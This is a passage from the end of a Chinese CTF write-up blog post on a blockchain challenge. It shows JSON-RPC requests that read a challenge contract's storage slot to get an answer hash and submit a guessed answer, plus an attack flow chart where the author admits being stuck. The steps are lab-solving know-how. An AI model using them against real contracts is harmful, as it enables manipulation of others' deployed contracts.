+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;jsonrpc&#34;</span><span class=p>:</span> <span class=s2>&#34;2.0&#34;</span><span class=p>,</span><span class=nt>&#34;method&#34;</span><span class=p>:</span> <span class=s2>&#34;eth_sendTransaction&#34;</span><span class=p>,</span><span class=nt>&#34;params&#34;</span><span class=p>:</span> <span class=p>[{</span><span class=nt>&#34;from&#34;</span><span class=p>:</span> <span class=s2>&#34;0x玩家地址&#34;</span><span class=p>,</span><span class=nt>&#34;to&#34;</span><span class=p>:</span> <span class=s2>&#34;0x挑战合约地址&#34;</span><span class=p>,</span><span class=nt>&#34;gas&#34;</span><span class=p>:</span> <span class=s2>&#34;0x1e8480&#34;</span><span class=p>,</span><span class=nt>&#34;gasPrice&#34;</span><span class=p>:</span> <span class=s2>&#34;0x4e3b29200&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=nt>&#34;nonce&#34;</span><span class=p>:</span> <span class=s2>&#34;0x最新的nonce值&#34;</span><span class=p>,</span><span class=nt>&#34;data&#34;</span><span class=p>:</span> <span class=s2>&#34;0x3ef81c38&#34;</span> <span class=err>+</span> <span class=s2>&#34;answer_bytes32_hex&#34;</span><span class=p>}],</span><span class=nt>&#34;id&#34;</span><span class=p>:</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 获取answer的hash值：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;jsonrpc&#34;</span><span class=p>:</span> <span class=s2>&#34;2.0&#34;</span><span class=p>,</span><span class=nt>&#34;method&#34;</span><span class=p>:</span> <span class=s2>&#34;eth_getStorageAt&#34;</span><span class=p>,</span><span class=nt>&#34;params&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;0x挑战合约地址&#34;</span><span class=p>,</span><span class=s2>&#34;0x0&#34;</span><span class=p>,</span><span class=s2>&#34;latest&#34;</span><span class=p>],</span><span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=mi>1</span><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 我的大致攻击流程</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>graph TD
+</span></span><span class=line><span class=cl>	A[通过的第三个数据包获取到answer的hash值] --&gt; B[通过第一个数据包获取最新的nonce值]
+</span></span><span class=line><span class=cl>	B --&gt; C[获取到原始的answer] 
+</span></span><span class=line><span class=cl>	C --&gt; D[通过第二个数据包提交原始answer]
+</span></span></code></pre></td></tr></table></div></div><p>​ 我就卡在了获取原始answer这里。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a>
+<a href=/tags/wp/>WP</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/%E7%AC%AC%E5%8D%81%E5%85%AB%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E6%9A%A8%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E9%98%B2%E6%8A%A4%E8%B5%9B%E4%B8%AA%E4%BA%BAwp/><div class=article-image><img src=/p/%E7%AC%AC%E5%8D%81%E5%85%AB%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E6%9A%A8%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E9%98%B2%E6%8A%A4%E8%B5%9B%E4%B8%AA%E4%BA%BAwp/cover.e5528f24cb0e694d263d709adfaa3748_hu5847781009274770924.png width=250 height=150 loading=lazy alt="Featured image of post 第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）个人WP" data-hash="md5-5VKPJMsOaU0mPXCa36o3SA=="></div><div class=article-details><h2 class=article-title>第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）个人WP</h2></div></a></article><article class=has-image><a href=/p/2024%E9%87%8D%E5%BA%86%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E4%B8%AA%E4%BA%BAwp/><div class=article-image><img src=/p/2024%E9%87%8D%E5%BA%86%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E4%B8%AA%E4%BA%BAwp/cover.1acc1b33ca2a86d249d1c2bacf74ccbc_hu7014529430257423806.jpg width=250 height=150 loading=lazy alt="Featured image of post 2024重庆市大学生信息安全竞赛个人WP" data-hash="md5-GswbM8oqhtJJ0cK6z3TMvA=="></div><div class=article-details><h2 class=article-title>2024重庆市大学生信息安全竞赛个人WP</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2025 hadagaga blog</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
